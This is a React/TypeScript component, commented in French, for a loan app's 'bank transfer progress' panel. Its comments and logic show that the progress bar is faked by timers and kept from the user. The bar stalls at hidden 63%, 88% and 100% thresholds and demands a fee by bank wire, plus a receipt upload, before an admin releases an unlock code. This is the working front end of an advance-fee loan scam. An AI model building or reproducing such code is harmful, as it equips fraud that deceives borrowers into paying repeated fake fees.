import { useEffect, useMemo, useRef, useState } from "react";
import { useTranslation } from "react-i18next";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/lib/auth-context";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent } from "@/components/ui/card";
import { Progress } from "@/components/ui/progress";
import { Badge } from "@/components/ui/badge";
import { toast } from "sonner";
import {
  Loader2,
  Lock,
  AlertCircle,
  KeyRound,
  CheckCircle2,
  Upload,
  FileText,
  Hourglass,
  Building2,
  ShieldCheck,
  Copy,
  ScanLine,
} from "lucide-react";
import { formatCurrency } from "@/lib/loan-helpers";
import { notifyAllAdmins } from "@/lib/notifications";

/**
 * Panneau de progression du virement bancaire.
 *
 * Logique cachée des étapes :
 *  - L'utilisateur ne voit JAMAIS « 63% / 88% / 100% » ni « 1/3 ».
 *  - On présente une seule barre « Progression » qui :
 *      • s'anime de 0% à un palier de blocage (premier palier 63%)
 *        sur ~60s à partir de `step_started_at`,
 *      • se fige sur ce palier dès qu'un blocage est rencontré,
 *      • redémarre vers le palier suivant après déblocage admin,
 *      • atteint 100% quand le virement est validé.
 *  - Internamente la base utilise toujours step ∈ {63, 88, 100}.
 */

interface UnlockCodeRow {
  id: string;
  loan_id: string;
  step: number; // 63 | 88 | 100
  fee_amount: number;
  account_holder: string | null;
  iban: string | null;
  bic: string | null;
  description: string | null;
  payment_address: string | null; // legacy fallback
  code: string | null;
  released: boolean;
  used: boolean;
  receipt_path: string | null;
  receipt_status: "pending" | "approved" | "rejected" | null;
}

interface Props {
  withdrawalId: string;
  loanId: string;
  /** Valeurs persistées (provenant de `withdrawals`). */
  progress: number;
  currentStep: number; // 0..3
  stepStartedAt: string; // ISO date
  /** Permet au parent de rafraîchir ses propres données. */
  status?: string;
  onChanged?: () => void;
  /** Affichage compact (utilisé en modal). */
  compact?: boolean;
}

const STEPS = [63, 88, 100] as const; // interne uniquement
const STEP_DURATION_MS: Record<number, number> = {
  63: 60_000,   // 0 → 63 sur 60s
  88: 30_000,   // 63 → 88 sur 30s
  100: 25_000,  // 88 → 100 sur 25s
};

function targetForStep(stepIdx: number): number {
  // step 0 vise 63, step 1 vise 88, step 2 vise 100, step 3 = terminé
  if (stepIdx >= 3) return 100;
  return STEPS[stepIdx];
}
function previousTarget(stepIdx: number): number {
  if (stepIdx <= 0) return 0;
  return STEPS[stepIdx - 1];
}

export function TransferProcessPanel({
  withdrawalId,
  loanId,
  progress: progressProp,
  currentStep: currentStepProp,
  stepStartedAt: stepStartedAtProp,
  status: statusProp,
  onChanged,
  compact = false,
}: Props) {
  const { t } = useTranslation();
  const { user } = useAuth();
  const [codes, setCodes] = useState<UnlockCodeRow[]>([]);
  const [code, setCode] = useState("");
  const [busy, setBusy] = useState(false);
  const [uploading, setUploading] = useState(false);

  // Snapshot LOCAL du virement, ré-hydraté en realtime — source de vérité
  const [snapshot, setSnapshot] = useState({
    progress: progressProp ?? 0,
    currentStep: currentStepProp ?? 0,
    stepStartedAt: stepStartedAtProp,
    status: statusProp,
  });
  const progress = snapshot.progress;
  const currentStep = snapshot.currentStep;
  const stepStartedAt = snapshot.stepStartedAt;
  const status = snapshot.status;

  const [animatedProgress, setAnimatedProgress] = useState<number>(progressProp ?? 0);
  const fileInputRef = useRef<HTMLInputElement | null>(null);
  const advanceLockRef = useRef(false);

  // Resynchro si le parent envoie de nouvelles valeurs (rares mais possibles)
  useEffect(() => {
    setSnapshot((s) => {
      if (
        s.progress === progressProp &&
        s.currentStep === currentStepProp &&
        s.stepStartedAt === stepStartedAtProp &&
        s.status === statusProp
      ) return s;
      return {
        progress: progressProp ?? s.progress,
        currentStep: currentStepProp ?? s.currentStep,
        stepStartedAt: stepStartedAtProp ?? s.stepStartedAt,
        status: statusProp ?? s.status,
      };
    });
  }, [progressProp, currentStepProp, stepStartedAtProp, statusProp]);

  // ---------- Chargement codes + realtime (codes + withdrawal lui-même) ----------
  useEffect(() => {
    void loadCodes();
    void refreshWithdrawal();
    const ch = supabase
      .channel(`tpp-${loanId}-${withdrawalId}`)
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "loan_unlock_codes", filter: `loan_id=eq.${loanId}` },
        () => void loadCodes(),
      )
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "withdrawals", filter: `id=eq.${withdrawalId}` },
        (payload) => {
          const r = payload.new as any;
          setSnapshot({
            progress: r.progress ?? 0,
            currentStep: r.current_step ?? 0,
            stepStartedAt: r.step_started_at ?? new Date().toISOString(),
            status: r.status,
          });
        },
      )
      .subscribe();
    return () => {
      void supabase.removeChannel(ch);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [loanId, withdrawalId]);

  async function loadCodes() {
    const { data } = await supabase
      .from("loan_unlock_codes" as any)
      .select("*")
      .eq("loan_id", loanId)
      .order("step", { ascending: true });
    setCodes((data as unknown as UnlockCodeRow[]) ?? []);
  }

  async function refreshWithdrawal() {
    const { data } = await supabase
      .from("withdrawals")
      .select("progress, current_step, step_started_at, status")
      .eq("id", withdrawalId)
      .maybeSingle();
    if (data) {
      const d = data as any;
      setSnapshot({
        progress: d.progress ?? 0,
        currentStep: d.current_step ?? 0,
        stepStartedAt: d.step_started_at ?? new Date().toISOString(),
        status: d.status,
      });
    }
  }

  // ---------- Animation de la barre ----------
  const target = targetForStep(currentStep);
  const prev = previousTarget(currentStep);
  const stepStartTs = useMemo(
    () => (stepStartedAt ? new Date(stepStartedAt).getTime() : Date.now()),
    [stepStartedAt],
  );

  useEffect(() => {
    advanceLockRef.current = false;

    if (currentStep >= 3) {
      setAnimatedProgress(100);
      return;
    }
    if (progress >= target) {
      setAnimatedProgress(target);
      advanceLockRef.current = true;
      return;
    }
    // Au passage d'une étape à la suivante, repartir visuellement du palier précédent
    setAnimatedProgress(prev);

    const duration = STEP_DURATION_MS[target] ?? 60_000;
    const tick = () => {
      const elapsed = Date.now() - stepStartTs;
      const ratio = Math.max(0, Math.min(1, elapsed / duration));
      const value = Math.min(target, prev + (target - prev) * ratio);
      setAnimatedProgress(Math.round(value * 10) / 10);

      if (ratio >= 1 && !advanceLockRef.current) {
        advanceLockRef.current = true;
        setAnimatedProgress(target);
        void persistReachedTarget(target);
      }
    };
    tick();
    const iv = window.setInterval(tick, 250);
    return () => window.clearInterval(iv);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [currentStep, stepStartTs, target, prev, progress]);

  async function persistReachedTarget(value: number) {
    const { data, error } = await supabase
      .from("withdrawals")
      .update({
        progress: value,
      })
      .eq("id", withdrawalId)
      .lt("progress", value)
      .select();

    if (!error && data && data.length > 0) {
      await notifyAllAdmins({
        titleKey: "notif.transferProcess.adminValidationTitle",
        messageKey: "notif.transferProcess.adminValidationMsg",
        link: "/admin",
        category: "warning",
      });

      await refreshWithdrawal();
    }
  }

  // ---------- Logique d'affichage ----------
  const isRejected = status === "rejete" || status === "rejected" || status === "cancelled";
  const isFinal = !isRejected && (currentStep >= 3 || status === "envoye" || status === "validated");
  const hasReachedTarget =
    animatedProgress >= target - 0.1 || progress >= target;
  const isAnimating = !isFinal && !isRejected && !hasReachedTarget;
  const isBlocked = !isFinal && !isRejected && hasReachedTarget;
  const currentRow = isBlocked ? codes.find((c) => c.step === target) : undefined;

  // ---------- Actions ----------
  async function handleUpload(file: File) {
    if (!user || !currentRow) return;
    if (file.size > 10 * 1024 * 1024) {
      toast.error(t("transferProcess.fileTooBig"));
      return;
    }
    setUploading(true);
    const safeName = file.name.replace(/[^a-zA-Z0-9._-]/g, "_");
    const path = `${user.id}/${loanId}/${currentRow.step}/${Date.now()}-${safeName}`;
    const { error: upErr } = await supabase.storage
      .from("transfer-receipts")
      .upload(path, file, { upsert: true });
    if (upErr) {
      setUploading(false);
      toast.error(upErr.message);
      return;
    }
    const { error } = await supabase
      .from("loan_unlock_codes" as any)
      .update({
        receipt_path: path,
        receipt_uploaded_at: new Date().toISOString(),
        receipt_status: "pending",
      })
      .eq("id", currentRow.id);
    setUploading(false);
    if (error) {
      toast.error(error.message);
      return;
    }
    await notifyAllAdmins({
      titleKey: "notif.transferProcess.adminReceiptTitle",
      messageKey: "notif.transferProcess.adminReceiptMsg",
      link: "/admin",
      category: "info",
    });
    toast.success(t("transferProcess.receiptSent"));
    void loadCodes();
  }

  async function submitCode() {
    if (!currentRow) return;
    setBusy(true);
    const { data, error } = await (supabase as any).rpc("advance_transfer_with_unlock_code", {
      _withdrawal_id: withdrawalId,
      _code: code.trim(),
    });
    const result = Array.isArray(data) ? data[0] : data;
    if (error || !result?.success) {
      setBusy(false);
      toast.error(result?.message === "step_not_reached" ? t("transferSteps.stepNotReached") : t("transferSteps.invalidCode"));
      return;
    }
    const nowIso = new Date().toISOString();
    const newStep = Number(result.current_step ?? currentStep + 1);
    const newProgress = Number(result.progress ?? (STEPS[currentStep] ?? 0));
    const newStatus = String(result.status ?? status ?? "en_traitement");
    setBusy(false);
    setCode("");

    advanceLockRef.current = false;
    setSnapshot({
      progress: newProgress,
      currentStep: newStep,
      stepStartedAt: nowIso,
      status: newStatus,
    });
    setAnimatedProgress(newStep >= 3 ? 100 : previousTarget(newStep));

    toast.success(
      newStep >= 3 ? t("transferSteps.successFinal") : t("transferSteps.advanced", { p: target }),
    );
    void refreshWithdrawal();
    onChanged?.();
  }

  function copyToClipboard(value: string, label: string) {
    if (typeof navigator !== "undefined" && navigator.clipboard) {
      void navigator.clipboard.writeText(value);
      toast.success(t("transferProcess.copied", { label }));
    }
  }

  // ---------- Rendu ----------
  const displayProgress = isFinal
  ? 100
  : isBlocked
  ? target
  : animatedProgress;

  return (
    <div className={compact ? "" : "space-y-6"}>
      {/* Barre de progression neutre (aucun palier visible) */}
      <div>
        <div className="flex justify-between text-xs font-semibold mb-2">
          <span className="flex items-center gap-1.5 text-muted-foreground">
            <ShieldCheck className="h-3.5 w-3.5" /> {t("transferProcess.progress")}
          </span>
          <span className="tabular-nums text-foreground">{Math.floor(displayProgress)}%</span>
        </div>
        <Progress value={displayProgress} className="h-3" />
        <div className="mt-2 flex items-center gap-2 text-xs text-muted-foreground">
          {isFinal ? (
            <Badge className="bg-success/15 text-success border-0 gap-1">
              <CheckCircle2 className="h-3 w-3" /> {t("transferProcess.validatedBadge")}
            </Badge>
          ) : isBlocked ? (
            <Badge className="bg-warning/15 text-warning border-0 gap-1">
              <Lock className="h-3 w-3" /> {t("transferProcess.complianceBadge")}
            </Badge>
          ) : (
            <Badge className="bg-info/15 text-info border-0 gap-1">
              <ScanLine className="h-3 w-3 animate-pulse" /> {t("transferProcess.processingBadge")}
            </Badge>
          )}
        </div>
      </div>

      {/* État final */}
      {isFinal && (
        <Card className="border-success/40 bg-success/5">
          <CardContent className="p-5 flex items-start gap-3">
            <CheckCircle2 className="h-5 w-5 text-success mt-0.5" />
            <div>
              <p className="font-semibold text-success">{t("transferProcess.finalTitle")}</p>
              <p className="text-xs text-muted-foreground mt-1">
                {t("transferProcess.finalDesc")}
              </p>
            </div>
          </CardContent>
        </Card>
      )}

      {/* En cours d'animation */}
      {isAnimating && (
        <Card>
          <CardContent className="p-5 flex items-start gap-3">
            <Loader2 className="h-5 w-5 text-info mt-0.5 animate-spin" />
            <div>
              <p className="font-semibold">{t("transferProcess.animatingTitle")}</p>
              <p className="text-xs text-muted-foreground mt-1">
                {t("transferProcess.animatingDesc")}
              </p>
            </div>
          </CardContent>
        </Card>
      )}

      {/* Bloqué */}
      {isBlocked && (
        <Card>
          <CardContent className="p-5 space-y-4">
            <div className="flex items-start gap-3 rounded-xl bg-warning/10 p-3 text-sm text-warning">
              <Lock className="h-4 w-4 mt-0.5 shrink-0" />
              <div>
                <p className="font-semibold">{t("transferProcess.blockedTitle", { p: target })}</p>
                <p className="text-xs mt-1 text-warning/80">
                  {t("transferProcess.blockedDesc", { p: target })}
                </p>
              </div>
            </div>

            {!currentRow ? (
              <div className="flex items-start gap-3 rounded-xl border border-dashed p-4 text-sm">
                <Hourglass className="h-4 w-4 mt-0.5 text-info" />
                <div>
                  <p className="font-semibold">{t("transferProcess.configTitle")}</p>
                  <p className="text-xs text-muted-foreground mt-1">
                    {t("transferProcess.configDesc")}
                  </p>
                </div>
              </div>
            ) : (
              <>
                {/* Frais à régler */}
                <div className="rounded-xl bg-secondary p-4">
                  <p className="text-xs text-muted-foreground">{t("transferProcess.fee")}</p>
                  <p className="font-semibold text-3xl tabular-nums text-primary">
                    {formatCurrency(Number(currentRow.fee_amount))}
                  </p>
                </div>

                {/* Ordre de virement bancaire (style RIB) */}
                {(currentRow.iban || currentRow.account_holder || currentRow.payment_address) && (
                  <div className="rounded-xl border border-border overflow-hidden">
                    <div className="bg-primary/5 px-4 py-2.5 flex items-center gap-2 border-b border-border">
                      <Building2 className="h-4 w-4 text-primary" />
                      <span className="text-sm font-semibold">{t("transferProcess.bankOrder")}</span>
                    </div>
                    <div className="p-4 space-y-3 text-sm">
                      <BankRow
                        label={t("transferProcess.accountHolder")}
                        value={currentRow.account_holder ?? ""}
                        onCopy={copyToClipboard}
                      />
                      <BankRow
                        label={t("transfer.iban")}
                        value={currentRow.iban ?? currentRow.payment_address ?? ""}
                        mono
                        onCopy={copyToClipboard}
                      />
                      <BankRow
                        label={t("transfer.bic")}
                        value={currentRow.bic ?? ""}
                        mono
                        onCopy={copyToClipboard}
                      />
                      <BankRow
                        label={t("transferProcess.reason")}
                        value={currentRow.description ?? ""}
                        onCopy={copyToClipboard}
                      />
                    </div>
                  </div>
                )}

                {/* Upload du reçu */}
                <div className="space-y-2">
                  <Label className="text-xs flex items-center justify-between">
                    <span className="flex items-center gap-1.5">
                      <FileText className="h-3.5 w-3.5" />
                      {t("transferProcess.receiptLabel")}
                    </span>
                    {currentRow.receipt_status === "pending" && (
                      <Badge className="bg-warning/15 text-warning">{t("transferProcess.receiptPending")}</Badge>
                    )}
                    {currentRow.receipt_status === "approved" && (
                      <Badge className="bg-success/15 text-success">{t("transferProcess.receiptApproved")}</Badge>
                    )}
                    {currentRow.receipt_status === "rejected" && (
                      <Badge className="bg-destructive/15 text-destructive">{t("transferProcess.receiptRejected")}</Badge>
                    )}
                  </Label>
                  <input
                    ref={fileInputRef}
                    type="file"
                    accept="image/*,application/pdf"
                    className="hidden"
                    onChange={(e) => {
                      const f = e.target.files?.[0];
                      if (f) void handleUpload(f);
                    }}
                  />
                  <Button
                    variant="outline"
                    className="w-full"
                    disabled={uploading}
                    onClick={() => fileInputRef.current?.click()}
                  >
                    {uploading ? (
                      <Loader2 className="h-4 w-4 mr-2 animate-spin" />
                    ) : (
                      <Upload className="h-4 w-4 mr-2" />
                    )}
                    {currentRow.receipt_path ? t("transferProcess.replaceReceipt") : t("transferProcess.uploadReceipt")}
                  </Button>
                </div>

                {/* Saisie du code (visible uniquement si admin l'a envoyé) */}
                {currentRow.released && currentRow.code && !currentRow.used ? (
                  <div className="space-y-2 rounded-xl border border-primary/30 bg-primary/5 p-3">
                    <Label className="flex items-center gap-2 text-xs">
                      <KeyRound className="h-4 w-4" />
                      {t("transferProcess.unlockCodeReceived")}
                    </Label>
                    <Input
                      value={code}
                      onChange={(e) => setCode(e.target.value)}
                      placeholder={t("transferProcess.codePlaceholder")}
                      className="font-mono uppercase tracking-wider text-center"
                    />
                    <Button
                      className="w-full shadow-glow"
                      onClick={submitCode}
                      disabled={busy || !code.trim()}
                    >
                      {busy ? <Loader2 className="h-4 w-4 animate-spin mr-2" /> : null}
                      {t("transferProcess.validateAndContinue")}
                    </Button>
                  </div>
                ) : (
                  <div className="flex items-start gap-3 rounded-xl border border-dashed p-3 text-sm">
                    <AlertCircle className="h-4 w-4 mt-0.5 text-info" />
                    <div>
                      <p className="font-semibold">{t("transferProcess.waitingCodeTitle")}</p>
                      <p className="text-xs text-muted-foreground mt-1">
                        {t("transferProcess.waitingCodeDesc")}
                      </p>
                    </div>
                  </div>
                )}
              </>
            )}
          </CardContent>
        </Card>
      )}
    </div>
  );
}

function BankRow({
  label,
  value,
  mono,
  onCopy,
}: {
  label: string;
  value: string;
  mono?: boolean;
  onCopy: (v: string, l: string) => void;
}) {
  if (!value) return null;
  return (
    <div className="flex items-start justify-between gap-3 border-b border-border/60 pb-2 last:border-0 last:pb-0">
      <div className="min-w-0 flex-1">
        <p className="text-[11px] uppercase tracking-wide text-muted-foreground">{label}</p>
        <p className={`mt-0.5 break-all ${mono ? "font-mono text-sm" : "text-sm"}`}>{value}</p>
      </div>
      <button
        type="button"
        onClick={() => onCopy(value, label)}
        className="shrink-0 rounded-md p-1.5 text-muted-foreground hover:bg-secondary hover:text-foreground"
        aria-label={`Copier ${label}`}
      >
        <Copy className="h-3.5 w-3.5" />
      </button>
    </div>
  );
}
